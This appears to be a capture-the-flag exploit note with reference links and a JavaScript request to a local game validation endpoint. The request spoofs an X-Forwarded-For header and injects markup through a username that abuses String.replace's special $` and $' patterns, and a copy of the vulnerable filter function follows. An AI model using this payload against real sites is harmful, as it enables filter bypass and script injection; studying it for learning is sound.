# https://www.youtube.com/watch?v=4tZLGP6QQBk&list=PLd0IGoiDwc6LrnF22cXAmx6oaRzB7K3db&index=33
# https://security.stackexchange.com/questions/197532/how-can-i-exploit-a-xss-vulnerability-which-doesnt-allow-me-to-type-and-sym
# https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_string_as_a_parameter


"""
x = await fetch("http://localhost:3000/validate", {
  "headers": {
    "content-type": "application/json",
    "x-forwarded-for": "localhost",
    "Referer": "http://localhost:3000/",
  },
  "body": "{\"moveHistory\": [{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":10,\"y\":6},{\"dir\":-1,\"x\":11,\"y\":5},{\"dir\":-1,\"x\":9,\"y\":6},{\"dir\":-1,\"x\":9,\"y\":7},{\"dir\":-1,\"x\":8,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":6,\"y\":7},{\"dir\":-1,\"x\":5,\"y\":6},{\"dir\":-1,\"x\":5,\"y\":7},{\"dir\":-1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":2,\"y\":5},{\"dir\":1,\"x\":3,\"y\":5},{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":5},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":5,\"y\":5},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":5,\"y\":6},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":2},{\"dir\":-1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":5,\"y\":2},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":7,\"y\":6}], \"username\": \"$`$`admin$'$'\"}",
  "method": "POST"
});
data = await x.text();
data;

function filter(x) {
    const inputstring = x.replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
    const userTemplate = '<{username}>';
    return userTemplate.replace("{username}", inputstring);
}
filter("admin")
"""